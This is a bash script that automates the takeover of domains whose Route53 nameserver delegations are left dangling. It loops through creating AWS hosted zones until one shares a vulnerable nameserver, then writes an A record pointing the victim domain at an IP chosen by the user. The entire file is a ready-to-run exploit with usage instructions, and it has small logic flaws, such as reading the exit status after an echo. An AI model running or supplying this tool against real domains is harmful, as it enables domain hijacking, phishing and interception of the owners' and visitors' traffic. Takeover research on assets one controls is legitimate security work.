#!/bin/bash

# Script uses 'awscli' to exploit Route53 Dangling entries in hosted zones.
# 
# Script first checks whether a domain is vulnerable using the check script in the existing 
# directory. If it is, then it will check if it has any AWS nameservers, extract these AWS authority 
# nameservers, and then start creating hosted zones in Route53 using the profile credentials until
# it finds atleast one nameserver in the newly created hosted zone that matches the vulnerable 
# authority nameserver.
# 
# Once a valid hosted zone, it will now attempt to create a new A record pointing in the new hosted
# zone pointing to an IP of your choice.
# 
# Pre-requisites:
#     Pre-requisites for the check script
#     awscli
#     AWS credentials, configured in ~/.aws/credentials, with access to Route53 to Get, List and
#         Create Hosted zones AND new DNS records
#
# Args:
#     domain: Domain to attempt to compromise
#     aws_profile: Profile name in ~/.aws/credentials file
#     redirect_host: IP address to point to
#     sleep_time: Time to sleep (in seconds)
# 
# Prints:
#     Prints the debug log as it tries to created hosted zones, if it creates a hosted zone with 
#     atleast one nameserver, it will report success AND also, create the A record describing it.
# 
# Examples: 
#   To try to takeover the domain, test.some-domain.com, confirmed to be on vulnerable to AWS 
#   Route53 for redirection to a random IP, 1.1.1.1 using 'default' AWS profile credentials:
#       ./aws_route53_takeover_exploit.sh test.some-domain.com default 1.1.1.1
#

if [ $# -lt 3 ]; then
    echo "[-] Usage: $0 <domain> <aws_profile> <redirect_host> [sleep=3]"
    exit
fi

# Get a list of all the domains from the user to verify
domain="$1"
aws_profile="$2"
redirect_host="$3"
sleep_time=${4:-"3"}

# Get the directory where script is located
script_dir=$(dirname "$0")

echo "[*] Checking whether domain: $domain is vulnerable, and locating vulnerable nameservers"
check_output=$(echo "$domain" | "$script_dir/cloud_dns_takeover_check.sh")

echo "[*] Getting vulnerable nameservers for domain: $domain that could allow takeover"
vuln_nameservers=$(echo "$check_output" | egrep -io "nameserver: [a-zA-Z0-9\_\.\-]+" \
                   | cut -d" " -f2 | sed -E "s/\.$//g")
echo "$vuln_nameservers"

echo "[*] Getting for vuln AWS nameservers for domain: $domain"
vuln_aws_nameservers=$(echo "$vuln_nameservers" | grep -i "awsdns")
echo "$vuln_aws_nameservers"

if [ ! -z "$vuln_aws_nameservers" ]; then
    echo "[*] Starting loop to create Route-53 hosted zone with same nameservers as vulnerable ones"

    # Count number of tries
    try=1

    # Set a flag to track whether hosted zone has been found
    found_hosted_zone=0

    # Keep looping until we find the hosted zone
    while [ "$found_hosted_zone" == "0" ]; do

        # Create a unique caller reference string
        caller_ref="$(date +%Y%m%d-%H%M%S)"
    
        echo "[*] Try: $try. Create a Route-53 hosted zone with caller-reference: $caller_ref"
        hosted_zone_info=$(aws route53 create-hosted-zone --name "$domain" --caller-ref "$caller_ref")
        echo "$hosted_zone_info"
    
        echo "[*] Checking if zone created successfully"
        status_code="$?"
        if [ "$status_code" != "0" ]; then
            echo "[-] Something went wrong when creating hosted zone. Exiting. Error: "
            echo "$hosted_zone_info"
            exit
        else
            echo "[*] Try: $try. Discovered the hosted zone nameservers"
            hosted_zone_nameservers=$(echo "$hosted_zone_info"  |  jq -r ".DelegationSet.NameServers[]")

            echo "[*] Try: $try. Discovering the hosted zone ID"
            hosted_zone_id=$(echo "$hosted_zone_info" |  jq -r ".HostedZone.Id" | egrep -io "[a-zA-Z0-9\_\-]+$")

            echo "[+] Try: $try. Hosted zone ID: $hosted_zone_id, Hosted zone nameservers: $hosted_zone_nameservers"

            echo "[*] Try: $try. Checking if any vuln AWS nameserver in vuln AWS nameservers list"
            IFS=$'\n'
            for vuln_ns in $vuln_aws_nameservers; do 

                echo "[*] Try: $try. Checking if vuln_ns: $vuln_ns in our created hosted zone's nameservers"
                grep_check=$(echo "$hosted_zone_nameservers" | grep -i "$vuln_ns")
                if [ ! -z "$grep_check" ]; then
                    echo "[+] Try: $try. Hosted zone with ID: $hosted_zone_id found vulnerable nameserver: $vuln_ns"
                    found_hosted_zone=1
                    break
                fi
            done

            if [ "$found_hosted_zone" == "0" ]; then
                echo "[*] Try: $try. Remove hosted zone ID: $hosted_zone_id as no common NS"
                aws route53 delete-hosted-zone --id "$hosted_zone_id" --profile "$aws_profile"
            fi
        fi

        try=$(($try + 1))

        echo "[*] Sleeping before next try for $sleep_time seconds"
        sleep "$sleep_time"
    done

    if [ "$found_hosted_zone" == "1" ]; then
        echo "[*] Preparing JSON recordset for hosted zone with ID: $hosted_zone_id"
        cat<<EOF > in-create-recordset-$hosted_zone_id.json
{
            "Comment": "CREATE an A recordset for domain: $domain to host: $redirect_host",
            "Changes": [
                {
	            "Action": "CREATE",
                        "ResourceRecordSet": {
                                    "Name": "$domain",
                                    "Type": "A",
                                    "TTL": 60,
                                 "ResourceRecords": [{ "Value": "$redirect_host"}]
			}
                }
            ]
}
EOF
        echo "[*] Creating record in hosted zone with ID: $hosted_zone_id to redirect requests for domain: $domain to host: $redirect_host"
        aws route53 change-resource-record-sets --hosted-zone-id "$hosted_zone_id" \
                                                --change-batch file://"in-create-recordset-$hosted_zone_id.json" \
                                                --profile "$aws_profile"
    fi
else
    echo "[-] No vulnerable AWS nameservers found for domain: $domain"
fi

